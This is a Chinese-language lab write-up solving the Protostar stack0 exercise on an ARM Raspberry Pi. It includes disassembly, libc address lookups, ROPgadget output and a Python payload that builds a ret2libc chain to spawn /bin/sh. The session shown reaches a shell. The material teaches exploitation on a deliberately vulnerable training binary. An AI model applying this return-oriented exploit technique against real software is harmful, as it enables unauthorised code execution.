#stack0
@(protostar)

**试验环境**
- Raspberry Pi 2
- Linux raspberrypi 4.4.11-v7+ #888 SMP Mon May 23 20:10:33 BST 2016 armv7l GNU/Linux

main反汇编代码如下：
```armasm
   0x00010450 <+4>:     add     r11, sp, #4
   0x00010454 <+8>:     sub     sp, sp, #80     ; 0x50
   0x00010458 <+12>:    str     r0, [r11, #-80] ; 0x50
   0x0001045c <+16>:    str     r1, [r11, #-84] ; 0x54
   0x00010460 <+20>:    mov     r3, #0
   0x00010464 <+24>:    str     r3, [r11, #-8]
   0x00010468 <+28>:    sub     r3, r11, #72    ; 0x48
   0x0001046c <+32>:    mov     r0, r3
   0x00010470 <+36>:    bl      0x102e8
   0x00010474 <+40>:    ldr     r3, [r11, #-8]
   0x00010478 <+44>:    cmp     r3, #0
   0x0001047c <+48>:    beq     0x1048c <main+64>
   0x00010480 <+52>:    ldr     r0, [pc, #24]   ; 0x104a0 <main+84>
   0x00010484 <+56>:    bl      0x102f4
   0x00010488 <+60>:    b       0x10494 <main+72>
   0x0001048c <+64>:    ldr     r0, [pc, #16]   ; 0x104a4 <main+88>
   0x00010490 <+68>:    bl      0x102f4
   0x00010494 <+72>:    mov     r0, r3
   0x00010498 <+76>:    sub     sp, r11, #4
   0x0001049c <+80>:    pop     {r11, pc}
   0x000104a0 <+84>:    andeq   r0, r1, r12, lsl r5
   0x000104a4 <+88>:    andeq   r0, r1, r8, asr #10
```
由0x10464和0x10468可知，只需64个字节就可以修改变量modified的值，72个字节则会覆盖返回地址。

**Ret2libc**
实验中关闭了ASLR，可以通过vmmap确定libc的基址为`0x76e63000`。
```bash
gef> vmmap
     Start        End     Offset Perm Path
0x00010000 0x00011000 0x00000000 r-x /home/pi/protostar/stack/stack0/stack0
0x00020000 0x00021000 0x00000000 rwx /home/pi/protostar/stack/stack0/stack0
0x76e63000 0x76f8e000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.19.so
0x76f8e000 0x76f9e000 0x0012b000 --- /lib/arm-linux-gnueabihf/libc-2.19.so
0x76f9e000 0x76fa0000 0x0012b000 r-x /lib/arm-linux-gnueabihf/libc-2.19.so
0x76fa0000 0x76fa1000 0x0012d000 rwx /lib/arm-linux-gnueabihf/libc-2.19.so
0x76fa1000 0x76fa4000 0x00000000 rwx
```
然后再通过print和gef的grep命令查找system和"/bin/sh"
```bash
gef> print system
$1 = {<text variable, no debug info>} 0x76e9cfac <__libc_system>
gef> grep /bin/sh
[+] Searching '/bin/sh' in memory
0x76f80c68-0x76f80c6f ->  "/bin/sh"
gef> x/s 0x76f80c68
0x76f80c68:	"/bin/sh"
```
```bash
~ $ ROPgadget --binary  /lib/arm-l/li/lib/arm-linux-gnueabihf/libc-2.19.so --only "pop"
Gadgets information
============================================================
0x0007a12c : pop {r0, r4, pc}
0x0010a300 : pop {r1, pc}
0x00019270 : pop {r3, pc}
0x00018628 : pop {r3, r4, r5, pc}
0x00082374 : pop {r3, r4, r5, pc} ; pop {r3, r4, r5, pc}
0x0001be80 : pop {r3, r4, r5, r6, r7, pc}
0x0006aaa0 : pop {r3, r4, r7, pc}
0x00018670 : pop {r4, pc}
0x0002dc00 : pop {r4, pc} ; pop {r4, pc}
0x0003b7e0 : pop {r4, pc} ; pop {r4, pc} ; pop {r4, pc}
0x00025de0 : pop {r4, r5, pc}
0x0001aa10 : pop {r4, r5, r6, pc}
0x000cc25c : pop {r4, r5, r6, pc} ; pop {r4, r5, r6, pc}
0x00018480 : pop {r4, r5, r6, r7, pc}
0x0002e198 : pop {r4, r5, r7, pc}
0x0002eccc : pop {r4, r7, pc}
0x00030dd8 : pop {r5, r6, r7, pc}
0x0002df80 : pop {r7, pc}
```
由于ARM汇编用寄存器传参，R0-R3 //？编译器调用约定？
选择`0x0007a12c : pop {r0, r4, pc}`和`0x00018670 : pop {r4, pc}`这两个gadgets。

```python
>>> from zio import *
>>> import struct
>>> io = zio('./stack0')
>>> payload = "A"*72
>>> payload += struct.pack('<I',0x76edd12c)//pop {r0, r4, pc}
>>> payload += struct.pack('<I',0x76f80c68)//"/bin/sh"
>>> payload += "AAAA"
>>> payload += struct.pack('<I',0x76e7b670)//pop {r4, pc}
>>> payload += "AAAA"
>>> payload += struct.pack('<I',0x76e9cfac)//system() call
>>> io.write(payload)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,ҭvh
                                                                            Ap¶流AAA¬Щv96
>>> io.interact()

you have changed the 'modified' variable
id
/bin/sh: 3: id: not found
ls
a.out  readme.md  shellcode.c  stack0  stack0.c
```
